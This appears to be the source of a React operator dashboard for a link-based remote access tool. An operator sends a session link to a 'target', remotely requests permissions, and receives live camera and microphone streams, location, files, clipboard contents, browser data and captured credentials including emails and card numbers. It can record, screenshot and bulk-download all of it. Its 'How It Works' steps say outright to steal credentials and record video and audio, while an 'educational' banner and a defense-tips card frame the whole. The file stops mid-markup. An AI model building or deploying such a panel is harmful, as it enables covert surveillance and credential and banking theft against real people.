import { useState, useEffect, useRef, useCallback } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from "@/hooks/use-toast";
import {
  Wifi, WifiOff, Copy, Trash2, Plus, Camera, Mic, MapPin,
  Smartphone, FileText, Clock, AlertTriangle, Shield, Eye,
  CheckCircle2, XCircle, Monitor, Loader2, ExternalLink,
  Video, VideoOff, MicOff, Download, CameraIcon,
  Power, FolderOpen, Clipboard, Circle, Square,
  KeyRound, ClipboardPaste, Globe, CreditCard,
  Activity, ChevronRight, ListChecks,
} from "lucide-react";

interface RemoteSession {
  id: number;
  organizationId: number;
  sessionToken: string;
  name: string;
  status: string;
  permissionsGranted: string[] | null;
  deviceInfo: any;
  locationData: any;
  createdBy: string;
  createdAt: string;
  expiresAt: string;
  lastActivity: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files" | "credentials" | "clipboard" | "browserData";

interface PermissionStatus { status: "idle" | "requested" | "granted" | "denied"; }

interface SessionEvent {
  id: number;
  timestamp: string;
  type: string;
  details: string;
  selected?: boolean;
}

export default function RemoteControlPage() {
  const { toast } = useToast();
  const [sessionName, setSessionName] = useState("");
  const [expiryMinutes, setExpiryMinutes] = useState("60");
  const [activeSessionToken, setActiveSessionToken] = useState<string | null>(null);
  const [targetConnected, setTargetConnected] = useState(false);
  const [liveDeviceInfo, setLiveDeviceInfo] = useState<any>(null);
  const [liveLocation, setLiveLocation] = useState<any>(null);
  const [liveFiles, setLiveFiles] = useState<any[]>([]);
  const [liveBrowserData, setLiveBrowserData] = useState<any>(null);
  const [liveClipboard, setLiveClipboard] = useState<any[]>([]);
  const [liveCredentials, setLiveCredentials] = useState<any[]>([]);
  const [events, setEvents] = useState<SessionEvent[]>([]);
  const [permissionStatuses, setPermissionStatuses] = useState<Record<PermissionKey, PermissionStatus>>({
    camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
    deviceInfo: { status: "idle" }, files: { status: "idle" }, credentials: { status: "idle" },
    clipboard: { status: "idle" }, browserData: { status: "idle" },
  });
  const [cameraEnabled, setCameraEnabled] = useState(true);
  const [micEnabled, setMicEnabled] = useState(true);
  const [isRecordingVideo, setIsRecordingVideo] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [videoRecordTime, setVideoRecordTime] = useState(0);
  const [audioRecordTime, setAudioRecordTime] = useState(0);
  const eventIdRef = useRef(0);

  const wsRef = useRef<WebSocket | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const videoRecorderRef = useRef<MediaRecorder | null>(null);
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const videoChunksRef = useRef<Blob[]>([]);
  const audioChunksRef = useRef<Blob[]>([]);
  const videoTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const audioTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const receivedStreamRef = useRef<MediaStream | null>(null);

  const addEvent = useCallback((type: string, details: string) => {
    eventIdRef.current += 1;
    setEvents((prev) => [{ id: eventIdRef.current, timestamp: new Date().toISOString(), type, details, selected: false }, ...prev]);
  }, []);

  const { data: sessions = [], isLoading } = useQuery<RemoteSession[]>({ queryKey: ["/api/remote-sessions"] });

  const createMutation = useMutation({
    mutationFn: async (data: { name: string; expiryMinutes: number }) => { const res = await apiRequest("POST", "/api/remote-sessions", data); return res.json(); },
    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); setSessionName(""); toast({ title: "Session created" }); },
  });

  const deleteMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("DELETE", `/api/remote-sessions/${id}`); },
    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); toast({ title: "Session deleted" }); },
  });

  const sendToTarget = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(JSON.stringify(msg));
  }, []);

  const connectToSession = useCallback((token: string) => {
    if (wsRef.current) wsRef.current.close();
    setActiveSessionToken(token);
    setTargetConnected(false);
    setLiveDeviceInfo(null); setLiveLocation(null); setLiveFiles([]); setLiveBrowserData(null);
    setLiveClipboard([]); setLiveCredentials([]); setEvents([]);
    setCameraEnabled(true); setMicEnabled(true);
    const resetPerms: Record<PermissionKey, PermissionStatus> = {
      camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
      deviceInfo: { status: "idle" }, files: { status: "idle" }, credentials: { status: "idle" },
      clipboard: { status: "idle" }, browserData: { status: "idle" },
    };
    setPermissionStatuses(resetPerms);
    eventIdRef.current = 0;

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;
    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_operator", token })); addEvent("system", "Connected to session as operator"); };

    ws.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);
        if (msg.type === "rc_target_connected") {
          setTargetConnected(true);
          addEvent("connection", "Target device connected");
          queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] });
        }
        if (msg.type === "rc_target_disconnected") { setTargetConnected(false); addEvent("connection", "Target device disconnected"); }
        if (msg.type === "rc_device_info") { setLiveDeviceInfo(msg.data); addEvent("data", "Device information received"); }
        if (msg.type === "rc_location") { setLiveLocation(msg.data); addEvent("data", `Location received: ${msg.data?.latitude?.toFixed(4)}, ${msg.data?.longitude?.toFixed(4)}`); }
        if (msg.type === "rc_file") { setLiveFiles((prev) => [...prev, msg.data]); addEvent("data", `File received: ${msg.data?.name}`); }
        if (msg.type === "rc_credentials") { setLiveCredentials((prev) => [...prev, msg.data]); addEvent("credential", `Credential captured (${msg.data?.type}): ${msg.data?.email || msg.data?.cardNumber?.replace(/.(?=.{4})/g, "*") || "N/A"}`); }
        if (msg.type === "rc_clipboard") { setLiveClipboard((prev) => [...prev, msg.data]); addEvent("data", `Clipboard captured: "${(msg.data?.content || "").substring(0, 40)}..."`); }
        if (msg.type === "rc_browser_data") { setLiveBrowserData(msg.data); addEvent("data", "Browser data received"); }
        if (msg.type === "rc_permission_granted" && msg.permission) {
          setPermissionStatuses((prev) => ({ ...prev, [msg.permission]: { status: "granted" } }));
          addEvent("permission", `${msg.permission} access GRANTED by target`);
        }
        if (msg.type === "rc_permission_denied" && msg.permission) {
          setPermissionStatuses((prev) => ({ ...prev, [msg.permission]: { status: "denied" } }));
          addEvent("permission", `${msg.permission} access DENIED by target`);
        }
        if (msg.type === "rc_track_toggled") {
          if (msg.track === "camera") setCameraEnabled(msg.enabled);
          if (msg.track === "microphone") setMicEnabled(msg.enabled);
          addEvent("control", `${msg.track} ${msg.enabled ? "enabled" : "disabled"}`);
        }
        if (msg.type === "rc_offer") handleOffer(msg.sdp, ws);
        if (msg.type === "rc_ice_candidate" && peerRef.current) peerRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(() => {});
      } catch {}
    };
    ws.onclose = () => { setTargetConnected(false); };
  }, [activeSessionToken, addEvent]);

  const handleOffer = async (sdp: RTCSessionDescriptionInit, ws: WebSocket) => {
    if (peerRef.current) peerRef.current.close();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    peerRef.current = pc;
    pc.onicecandidate = (e) => { if (e.candidate && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: "rc_ice_candidate", candidate: e.candidate })); };
    pc.ontrack = (e) => { if (e.streams[0]) { receivedStreamRef.current = e.streams[0]; if (videoRef.current) videoRef.current.srcObject = e.streams[0]; } };
    await pc.setRemoteDescription(new RTCSessionDescription(sdp));
    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);
    if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: "rc_answer", sdp: answer }));
  };

  useEffect(() => { return () => { wsRef.current?.close(); peerRef.current?.close(); stopVideoRecording(); stopAudioRecording(); }; }, []);

  const disconnectSession = () => {
    wsRef.current?.close(); peerRef.current?.close(); stopVideoRecording(); stopAudioRecording();
    setActiveSessionToken(null); setTargetConnected(false); setLiveDeviceInfo(null); setLiveLocation(null);
    setLiveFiles([]); setLiveBrowserData(null); setLiveClipboard([]); setLiveCredentials([]);
    receivedStreamRef.current = null;
  };

  const requestPermission = (perm: PermissionKey) => {
    setPermissionStatuses((prev) => ({ ...prev, [perm]: { status: "requested" } }));
    sendToTarget({ type: "rc_request_permission", permission: perm });
    addEvent("request", `Requested ${perm} access from target`);
  };

  const toggleCamera = () => { const n = !cameraEnabled; setCameraEnabled(n); sendToTarget({ type: "rc_toggle_camera", enabled: n }); addEvent("control", n ? "Camera enabled" : "Camera disabled"); };
  const toggleMic = () => { const n = !micEnabled; setMicEnabled(n); sendToTarget({ type: "rc_toggle_mic", enabled: n }); addEvent("control", n ? "Mic enabled" : "Mic disabled"); };

  const takeScreenshot = () => {
    const v = videoRef.current;
    if (!v || !v.videoWidth) { toast({ title: "No video feed", variant: "destructive" }); return; }
    const c = document.createElement("canvas"); c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d")!.drawImage(v, 0, 0);
    const link = document.createElement("a"); link.download = `screenshot-${Date.now()}.png`; link.href = c.toDataURL("image/png"); link.click();
    addEvent("action", "Screenshot captured");
  };

  const startVideoRecording = () => {
    const s = receivedStreamRef.current; if (!s) { toast({ title: "No stream", variant: "destructive" }); return; }
    videoChunksRef.current = [];
    try {
      const r = new MediaRecorder(s, { mimeType: "video/webm;codecs=vp9,opus" });
      r.ondataavailable = (e) => { if (e.data.size > 0) videoChunksRef.current.push(e.data); };
      r.onstop = () => { const b = new Blob(videoChunksRef.current, { type: "video/webm" }); const l = document.createElement("a"); l.download = `recording-${Date.now()}.webm`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href); };
      r.start(1000); videoRecorderRef.current = r; setIsRecordingVideo(true); setVideoRecordTime(0);
      videoTimerRef.current = setInterval(() => setVideoRecordTime((t) => t + 1), 1000);
      addEvent("action", "Video recording started");
    } catch { toast({ title: "Recording not supported", variant: "destructive" }); }
  };

  const stopVideoRecording = () => {
    if (videoRecorderRef.current && videoRecorderRef.current.state !== "inactive") videoRecorderRef.current.stop();
    videoRecorderRef.current = null; setIsRecordingVideo(false);
    if (videoTimerRef.current) clearInterval(videoTimerRef.current); videoTimerRef.current = null;
    addEvent("action", "Video recording stopped");
  };

  const startAudioRecording = () => {
    const s = receivedStreamRef.current; if (!s) { toast({ title: "No stream", variant: "destructive" }); return; }
    const at = s.getAudioTracks(); if (!at.length) { toast({ title: "No audio track", variant: "destructive" }); return; }
    audioChunksRef.current = [];
    try {
      const r = new MediaRecorder(new MediaStream(at), { mimeType: "audio/webm;codecs=opus" });
      r.ondataavailable = (e) => { if (e.data.size > 0) audioChunksRef.current.push(e.data); };
      r.onstop = () => { const b = new Blob(audioChunksRef.current, { type: "audio/webm" }); const l = document.createElement("a"); l.download = `audio-${Date.now()}.webm`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href); };
      r.start(1000); audioRecorderRef.current = r; setIsRecordingAudio(true); setAudioRecordTime(0);
      audioTimerRef.current = setInterval(() => setAudioRecordTime((t) => t + 1), 1000);
      addEvent("action", "Audio recording started");
    } catch { toast({ title: "Audio recording not supported", variant: "destructive" }); }
  };

  const stopAudioRecording = () => {
    if (audioRecorderRef.current && audioRecorderRef.current.state !== "inactive") audioRecorderRef.current.stop();
    audioRecorderRef.current = null; setIsRecordingAudio(false);
    if (audioTimerRef.current) clearInterval(audioTimerRef.current); audioTimerRef.current = null;
    addEvent("action", "Audio recording stopped");
  };

  const copyText = (text: string, label: string) => { navigator.clipboard.writeText(text); toast({ title: `${label} copied` }); };
  const downloadFile = (file: any) => { if (!file.preview) return; const l = document.createElement("a"); l.download = file.name; l.href = file.preview; l.click(); };
  const downloadAllFiles = () => { liveFiles.forEach((f) => downloadFile(f)); addEvent("action", `Bulk download ${liveFiles.length} files`); };
  const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
  const getSessionLink = (t: string) => `${window.location.origin}/rc/${t}`;
  const copyLink = (t: string) => { navigator.clipboard.writeText(getSessionLink(t)); toast({ title: "Link copied" }); };

  const toggleEventSelect = (id: number) => { setEvents((prev) => prev.map((e) => e.id === id ? { ...e, selected: !e.selected } : e)); };
  const selectAllEvents = () => { setEvents((prev) => prev.map((e) => ({ ...e, selected: true }))); };
  const deselectAllEvents = () => { setEvents((prev) => prev.map((e) => ({ ...e, selected: false }))); };
  const exportSelectedEvents = () => {
    const sel = events.filter((e) => e.selected);
    if (!sel.length) { toast({ title: "No events selected" }); return; }
    const json = JSON.stringify(sel.map(({ id, timestamp, type, details }) => ({ id, timestamp, type, details })), null, 2);
    const b = new Blob([json], { type: "application/json" });
    const l = document.createElement("a"); l.download = `events-${Date.now()}.json`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href);
    toast({ title: `Exported ${sel.length} events` });
  };
  const copySelectedEvents = () => {
    const sel = events.filter((e) => e.selected);
    if (!sel.length) { toast({ title: "No events selected" }); return; }
    navigator.clipboard.writeText(sel.map((e) => `[${e.timestamp}] ${e.type}: ${e.details}`).join("\n"));
    toast({ title: `${sel.length} events copied` });
  };
  const clearSelectedEvents = () => { setEvents((prev) => prev.filter((e) => !e.selected)); toast({ title: "Selected events cleared" }); };

  const getStatusBadge = (status: string) => {
    const map: Record<string, { cls: string; label: string; tid: string }> = {
      active: { cls: "bg-green-500/20 text-green-400 border-green-500/30", label: "Active", tid: "badge-status-active" },
      pending: { cls: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30", label: "Pending", tid: "badge-status-pending" },
      expired: { cls: "bg-red-500/20 text-red-400 border-red-500/30", label: "Expired", tid: "badge-status-expired" },
      closed: { cls: "bg-gray-500/20 text-gray-400 border-gray-500/30", label: "Closed", tid: "badge-status-closed" },
    };
    const m = map[status]; if (!m) return <Badge variant="secondary">{status}</Badge>;
    return <Badge className={m.cls} data-testid={m.tid}>{m.label}</Badge>;
  };

  const getPermBadge = (s: PermissionStatus["status"]) => {
    if (s === "granted") return <Badge className="bg-green-500/20 text-green-400 border-green-500/30 text-[10px]"><CheckCircle2 className="w-3 h-3 mr-0.5" />Granted</Badge>;
    if (s === "denied") return <Badge className="bg-red-500/20 text-red-400 border-red-500/30 text-[10px]"><XCircle className="w-3 h-3 mr-0.5" />Denied</Badge>;
    if (s === "requested") return <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 text-[10px]"><Loader2 className="w-3 h-3 mr-0.5 animate-spin" />Pending</Badge>;
    return <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 text-[10px]">Idle</Badge>;
  };

  const permissionItems: { key: PermissionKey; label: string; icon: typeof Camera }[] = [
    { key: "camera", label: "Camera", icon: Camera }, { key: "microphone", label: "Microphone", icon: Mic },
    { key: "location", label: "Location", icon: MapPin }, { key: "deviceInfo", label: "Device Info", icon: Smartphone },
    { key: "files", label: "Files", icon: FolderOpen }, { key: "credentials", label: "Credentials", icon: KeyRound },
    { key: "clipboard", label: "Clipboard", icon: ClipboardPaste }, { key: "browserData", label: "Browser Data", icon: Globe },
  ];

  const selectedEventsCount = events.filter((e) => e.selected).length;

  return (
    <div className="p-4 sm:p-6 space-y-6 max-w-7xl mx-auto">
      <div className="flex items-center gap-3">
        <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-red-500/10 border border-red-500/20">
          <Eye className="w-5 h-5 text-red-400" />
        </div>
        <div>
          <h1 className="text-xl font-bold" data-testid="text-page-title">Remote Control</h1>
          <p className="text-xs text-muted-foreground">Educational cybersecurity remote access demonstration</p>
        </div>
      </div>

      <Card className="border-yellow-500/30 bg-yellow-500/5">
        <CardContent className="p-4 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
          <div className="text-sm">
            <p className="font-medium text-yellow-400">Educational Tool</p>
            <p className="text-muted-foreground text-xs mt-1">
              This tool demonstrates how attackers gain access to devices, steal credentials, banking info, and personal data through social engineering.
              All access requires explicit browser permission prompts. Use only for authorized cybersecurity training.
            </p>
          </div>
        </CardContent>
      </Card>

      {!activeSessionToken ? (
        <div className="space-y-6">
          <div className="grid gap-6 lg:grid-cols-2">
            <Card>
              <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Plus className="w-4 h-4" />Create New Session</CardTitle></CardHeader>
              <CardContent className="space-y-3">
                <Input placeholder="Session name (e.g., Training Demo 1)" value={sessionName} onChange={(e) => setSessionName(e.target.value)} data-testid="input-session-name" />
                <div className="flex gap-2">
                  <Select value={expiryMinutes} onValueChange={setExpiryMinutes}>
                    <SelectTrigger className="w-full" data-testid="select-expiry"><SelectValue /></SelectTrigger>
                    <SelectContent>
                      <SelectItem value="15">15 min</SelectItem><SelectItem value="30">30 min</SelectItem>
                      <SelectItem value="60">1 hour</SelectItem><SelectItem value="120">2 hours</SelectItem>
                      <SelectItem value="480">8 hours</SelectItem><SelectItem value="1440">24 hours</SelectItem>
                    </SelectContent>
                  </Select>
                  <Button onClick={() => createMutation.mutate({ name: sessionName, expiryMinutes: parseInt(expiryMinutes) })} disabled={!sessionName.trim() || createMutation.isPending} data-testid="button-create-session">
                    {createMutation.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}<span className="ml-1">Create</span>
                  </Button>
                </div>
              </CardContent>
            </Card>
            <Card>
              <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Shield className="w-4 h-4" />How It Works</CardTitle></CardHeader>
              <CardContent className="space-y-2 text-xs text-muted-foreground">
                {["Create session and copy the link", "Share link with target (email/message)", "Request permissions remotely from control panel", "Target sees popups and browser prompts", "Steal credentials, record video/audio, capture data"].map((t, i) => (
                  <div key={i} className="flex gap-2"><span className="font-mono text-primary">{i + 1}.</span><span>{t}</span></div>
                ))}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Monitor className="w-4 h-4" />Sessions ({sessions.length})</CardTitle></CardHeader>
            <CardContent>
              {isLoading ? <div className="flex justify-center py-8"><Loader2 className="w-6 h-6 animate-spin text-muted-foreground" /></div>
              : sessions.length === 0 ? <p className="text-center text-sm text-muted-foreground py-8">No sessions yet.</p>
              : (
                <div className="space-y-2">
                  {sessions.map((s) => (
                    <div key={s.id} className="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 p-3 rounded-lg border border-border/50 hover:border-border" data-testid={`session-row-${s.id}`}>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-medium truncate" data-testid={`text-session-name-${s.id}`}>{s.name}</span>
                          {getStatusBadge(s.status)}
                        </div>
                        <div className="flex items-center gap-3 mt-1 text-[10px] text-muted-foreground">
                          <span className="flex items-center gap-1"><Clock className="w-3 h-3" />Expires {new Date(s.expiresAt).toLocaleString()}</span>
                        </div>
                      </div>
                      <div className="flex items-center gap-1 flex-shrink-0">
                        <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(s.sessionToken)} data-testid={`button-copy-link-${s.id}`}><Copy className="w-3 h-3 mr-1" />Link</Button>
                        <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => connectToSession(s.sessionToken)} disabled={s.status === "expired" || s.status === "closed"} data-testid={`button-connect-${s.id}`}><Wifi className="w-3 h-3 mr-1" />Monitor</Button>
                        <Button size="sm" variant="ghost" className="h-7 w-7 p-0 text-red-400 hover:text-red-300" onClick={() => deleteMutation.mutate(s.id)} data-testid={`button-delete-${s.id}`}><Trash2 className="w-3 h-3" /></Button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-semibold">Live Session</h2>
              {targetConnected ? (
                <Badge className="bg-green-500/20 text-green-400 border-green-500/30 animate-pulse"><Wifi className="w-3 h-3 mr-1" />Target Connected</Badge>
              ) : (
                <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30"><WifiOff className="w-3 h-3 mr-1" />Waiting...</Badge>
              )}
            </div>
            <div className="flex items-center gap-2">
              <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(activeSessionToken)} data-testid="button-copy-active-link"><Copy className="w-3 h-3 mr-1" />Link</Button>
              <Button size="sm" variant="outline" className="h-7 text-xs border-red-500/30 text-red-400" onClick={disconnectSession} data-testid="button-disconnect"><WifiOff className="w-3 h-3 mr-1" />Disconnect</Button>
            </div>
          </div>

          {!targetConnected ? (
            <Card className="border-dashed">
              <CardContent className="p-8 text-center space-y-3">
                <Loader2 className="w-8 h-8 animate-spin text-muted-foreground mx-auto" />
                <p className="text-sm text-muted-foreground">Waiting for target to open the link...</p>
                <code className="text-xs bg-muted px-2 py-1 rounded max-w-md truncate block mx-auto" data-testid="text-session-link">{getSessionLink(activeSessionToken)}</code>
              </CardContent>
            </Card>
          ) : (
            <Tabs defaultValue="control" className="w-full">
              <TabsList className="w-full justify-start flex-wrap h-auto gap-1 bg-muted/30 p-1" data-testid="tabs-list">
                <TabsTrigger value="control" className="text-xs" data-testid="tab-control"><Power className="w-3 h-3 mr-1" />Control</TabsTrigger>
                <TabsTrigger value="feed" className="text-xs" data-testid="tab-feed"><Camera className="w-3 h-3 mr-1" />Live Feed</TabsTrigger>
                <TabsTrigger value="intel" className="text-xs" data-testid="tab-intel"><Shield className="w-3 h-3 mr-1" />Intelligence</TabsTrigger>
                <TabsTrigger value="files" className="text-xs" data-testid="tab-files"><FolderOpen className="w-3 h-3 mr-1" />Files ({liveFiles.length})</TabsTrigger>
                <TabsTrigger value="events" className="text-xs" data-testid="tab-events"><Activity className="w-3 h-3 mr-1" />Events ({events.length})</TabsTrigger>
              </TabsList>

              <TabsContent value="control" className="space-y-4 mt-4">
                <Card>
                  <CardHeader className="pb-2"><CardTitle className="text-sm flex items-center gap-2"><Power className="w-4 h-4 text-primary" />Remote Access Control</CardTitle></CardHeader>
                  <CardContent>
                    <div className="grid gap-2 grid-cols-2 sm:grid-cols-4 lg:grid-cols-8">
                      {permissionItems.map((item) => {
                        const st = permissionStatuses[item.key].status;
                        const Icon = item.icon;
                        return (
                          <div key={item.key} className="flex flex-col items-center gap-1.5 p-2.5 rounded-lg border border-border/50 bg-muted/20" data-testid={`control-perm-${item.key}`}>
                            <Icon className="w-4 h-4 text-muted-foreground" />
                            <span className="text-[10px] font-medium text-center leading-tight">{item.label}</span>
                            {getPermBadge(st)}
                            <Button size="sm" variant={st === "granted" ? "secondary" : "default"} className="h-6 text-[9px] w-full px-1" onClick={() => requestPermission(item.key)} disabled={st === "granted" || st === "requested"} data-testid={`button-request-${item.key}`}>
                              {st === "granted" ? "Done" : st === "requested" ? "..." : "Request"}
                            </Button>
                          </div>
                        );
                      })}
                    </div>
                    {(permissionStatuses.camera.status === "granted" || permissionStatuses.microphone.status === "granted") && (
                      <div className="flex items-center gap-2 mt-4 pt-3 border-t border-border/30">
                        <span className="text-xs text-muted-foreground font-medium mr-2">Stream:</span>
                        {permissionStatuses.camera.status === "granted" && (
                          <Button size="sm" variant={cameraEnabled ? "default" : "destructive"} className="h-7 text-xs" onClick={toggleCamera} data-testid="button-toggle-camera">
                            {cameraEnabled ? <><Video className="w-3 h-3 mr-1" />Cam On</> : <><VideoOff className="w-3 h-3 mr-1" />Cam Off</>}
                          </Button>
                        )}
                        {permissionStatuses.microphone.status === "granted" && (
                          <Button size="sm" variant={micEnabled ? "default" : "destructive"} className="h-7 text-xs" onClick={toggleMic} data-testid="button-toggle-mic">
                            {micEnabled ? <><Mic className="w-3 h-3 mr-1" />Mic On</> : <><MicOff className="w-3 h-3 mr-1" />Mic Off</>}
                          </Button>
                        )}
                      </div>
                    )}
                  </CardContent>
                </Card>

                <Card className="border-blue-500/20 bg-blue-500/5">
                  <CardHeader className="pb-2"><CardTitle className="text-sm flex items-center gap-2 text-blue-400"><Shield className="w-4 h-4" />Defense Recommendations</CardTitle></CardHeader>
                  <CardContent className="grid gap-3 sm:grid-cols-2 text-xs text-muted-foreground">
                    {[
                      { t: "Never grant permissions to unknown sites", d: "Legitimate services rarely need camera, mic, and location together." },
                      { t: "Check URLs carefully", d: "Attackers use look-alike domains to trick users." },
                      { t: "Never enter credentials on unfamiliar pages", d: "Phishing overlays mimic real login forms perfectly." },
                      { t: "Use browser privacy indicators", d: "Modern browsers show icons when camera/mic are active." },
                    ].map((r, i) => (
                      <div key={i} className="flex gap-2">
                        <CheckCircle2 className="w-4 h-4 text-green-400 flex-shrink-0 mt-0.5" />
                        <div><p className="font-medium text-foreground">{r.t}</p><p>{r.d}</p></div>
                      </div>
                    ))}
                  </CardContent>
                </Card>
              </TabsContent>

              <TabsContent value="feed" className="space-y-4 mt-4">
                <div className="grid gap-4 md:grid-cols-2">
                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Camera className="w-4 h-4 text-blue-400" />Camera Feed</span>
                        <div className="flex items-center gap-1">
                          <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={takeScreenshot} data-testid="button-screenshot"><CameraIcon className="w-3 h-3 mr-1" />Shot</Button>
                          {isRecordingVideo
                            ? <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopVideoRecording} data-testid="button-stop-video-record"><Square className="w-3 h-3 mr-1" />{formatTime(videoRecordTime)}</Button>
                            : <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startVideoRecording} data-testid="button-start-video-record"><Circle className="w-3 h-3 mr-1 text-red-400" />Rec</Button>
                          }
                        </div>
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="aspect-video bg-black rounded-lg overflow-hidden relative">
                        <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover" data-testid="video-camera-feed" />
                        <div className="absolute bottom-2 left-2 flex items-center gap-1">
                          <Badge className="bg-red-500/80 text-white border-0 text-[10px]">LIVE</Badge>
                          {!cameraEnabled && <Badge className="bg-gray-800/80 text-gray-300 border-0 text-[10px]">Off</Badge>}
                        </div>
                        {isRecordingVideo && <div className="absolute top-2 right-2"><Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse"><Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(videoRecordTime)}</Badge></div>}
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><Mic className="w-4 h-4 text-green-400" />Audio</span>
                        {isRecordingAudio
                          ? <Button size="sm" variant="destructive" className="h-6 px-2 text-[10px]" onClick={stopAudioRecording} data-testid="button-stop-audio-record"><Square className="w-3 h-3 mr-1" />{formatTime(audioRecordTime)}</Button>
                          : <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={startAudioRecording} data-testid="button-start-audio-record"><Circle className="w-3 h-3 mr-1 text-red-400" />Rec Audio</Button>
                        }
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      <div className="aspect-video bg-muted/30 rounded-lg flex items-center justify-center relative">
                        <div className="text-center space-y-2">
                          {micEnabled ? <Mic className="w-8 h-8 text-green-400 mx-auto animate-pulse" /> : <MicOff className="w-8 h-8 text-red-400 mx-auto" />}
                          <p className="text-xs text-muted-foreground">{micEnabled ? "Audio streaming live" : "Mic disabled"}</p>
                        </div>
                        {isRecordingAudio && <div className="absolute top-2 right-2"><Badge className="bg-red-600 text-white border-0 text-[10px] animate-pulse"><Circle className="w-2 h-2 mr-1 fill-current" />REC {formatTime(audioRecordTime)}</Badge></div>}
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader className="pb-2">
                      <CardTitle className="text-sm flex items-center justify-between">
                        <span className="flex items-center gap-2"><MapPin className="w-4 h-4 text-red-400" />Location</span>
                        {liveLocation && <Button size="sm" variant="ghost" className="h-6 px-2 text-[10px]" onClick={() => copyText(`${liveLocation.latitude}, ${liveLocation.longitude}`, "Location")} data-testid="button-copy-location"><Clipboard className="w-3 h-3 mr-1" />Copy</Button>}
                      </CardTitle>
                    </CardHeader>
                    <CardContent>
                      {liveLocation ? (
                        <div className="space-y-2">
                          <div className="grid grid-cols-2 gap-2 text-xs">
                            {[
                              { l: "Latitude", v: liveLocation.latitude?.toFixed(6), tid: "text-latitude" },
                              { l: "Longitude", v: liveLocation.longitude?.toFixed(6), tid: "text-longitude" },
                              { l: "Accuracy", v: `${liveLocation.accuracy?.toFixed(0)}m` },
                              { l: "Altitude", v: liveLocation.altitude ? `${liveLocation.altitude.toFixed(1)}m` : "N/A" },
                            ].map((d, i) => (
                              <div key={i} className="bg-muted/30 p-2 rounded">
                                <span className="text-muted-foreground">{d.l}</span>
                                <p className="font-mono" data-testid={d.tid}>{d.v}</p>
                              </div>
                            ))}
                          </div>
